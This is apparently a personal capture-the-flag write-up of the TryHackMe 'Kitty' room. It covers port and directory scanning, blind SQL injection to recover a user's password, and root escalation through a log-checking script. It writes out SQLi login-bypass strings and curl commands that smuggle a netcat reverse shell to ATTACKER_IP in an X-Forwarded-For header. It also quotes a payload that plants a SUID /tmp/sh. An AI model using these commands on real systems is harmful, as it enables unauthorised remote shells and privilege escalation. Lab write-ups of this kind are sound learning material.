Kitty.md

nmap

`sudo nmap -sS -p- 10.113.177.194`

found ssh (22) and http (80)

`sudo nmap -sC -sV -p22,80 10.113.177.194`

nothing directly exploitable

let's go bust some dirs with 40 threads

`gobuster dir -u http://10.113.177.194/ -w /usr/share/wordlists/dirb/common.txt -t 40 -x js,php,txt`

```
config.php           (Status: 200) [Size: 1]

index.php            (Status: 200) [Size: 1081]

logout.php           (Status: 302) [Size: 0] [--> index.php]

register.php         (Status: 200) [Size: 1567]

welcome.php          (Status: 302) [Size: 0] [--> index.php]

```

the only thing that was not under construction was index.php with a login form that responded to basic sqli but uppon logging in did not provide anything interesting

I also ran nikto and bro confirmed various sqli possibilities

`nikto -Tuning 9 -h http://10.113.177.194/index.php`

then I spent too much time with manual injection, before I remembered...

`BurpSuite --> capture a request to the page --> go to HTTP history --> save the request as request.txt--> sqlmap on it and pray`

so that's exactly what I did (probably better to save as xml but its ok)

I tried...

`sqlmap -r request.txt --dump --level=5`

for some reason, sqlmap could not find the injection (very basic manual injection worked tho so that is weird)

short break and let's try again (turn it off and turn it back on)

so no sqlmap, it just does not cut it

I found a very wise guy (0xb0b) and manually rewrote his script to understand it

this script automates SQLi to get the database name and then with a small tweak to the request also helps us get the tables

we found the database mywebsitse and table siteusers

with the same script, just modyfing the request, we find user kitty and her password

we use this to log in via SSH and it works

first-layer look:

`cd ..; ls` mania, `sudo -l` and `find / -perm -u=s 2>/dev/null`, `cat /etc/crontab` and its' friends ---> nothing

second-layer look:

I brought` LinEnum.sh` to no avail, but...

I also brought over pspy64 to monitor running processes, 

found root's /opt/log_checker.sh script that logs suspicious IPs (eg. when trying weak SQLi in the afformentioned form fields) to a temp log, writes the IP to /root/logged, and then deletes the temp log.

we could try to inject a command into the IP (BurpSuite maybe)

we have access to the actual website script that handles the suspicious requests that I simplified in pseudo-python code here:


```
bad_words = ["/sleep/i", "/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "/ifnull/i", "/ or /i"];
for word in bad_words:
    if word in username or word in password:
        print("SQL injection detected, this will be logged)
        ip = HTTP_X_FORWARDED_FOR
        # here the ip is logged into the temp log,
        # see that the root log is not mentioned here
        file_put_contents("/var/www/development/logged", ip);
        exit()

```

I learned a new command: `apache2ctl -S` which gives us more configuration info about the web server (we are in /var/www/development)

and shows us the server 127.0.0.1:8000 with /etc/apache2/sites-enabled/dev_site.conf

`cat /etc/apache2/sites-enabled/dev_site.conf` gives us the port where it listens: Listen 127.0.0.1:8080


so if we send a POST request to this server with X-Forwarded-For containing the command, it should exec as root

I got it to connect as kitty, with this command (notice that the "$" is not exiescaped so it will get executed while doing the request)

`curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "X-Forwarded-For: $(busybox nc ATTACKER_IP 7777 -e /bin/bash)" -d "username='or'1'=1&password=password" http://127.0.0.1:8080/index.php`

I tried exiting the root the request would not log even though there was obvious sql injection

`curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "X-Forwarded-For: \$(busybox nc ATTACKER_IP 7777 -e /bin/bash)" -d "username='or'1&password=SELECT" http://127.0.0.1:8080/index.php`

now I had to look up another writeup, which solved this with this request:

and /tmp/sh -p is just the 'jump to root'

```

# credit: https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme-rooms/kitty.md

curl -X POST -H "X-Forwarded-For: ; cp /bin/sh /tmp/sh && chmod u+s /tmp/sh;" -d "username=+or+&password=test" localhost:8080

/tmp/sh -p

```

this was a pretty hard "medium" room, but still doable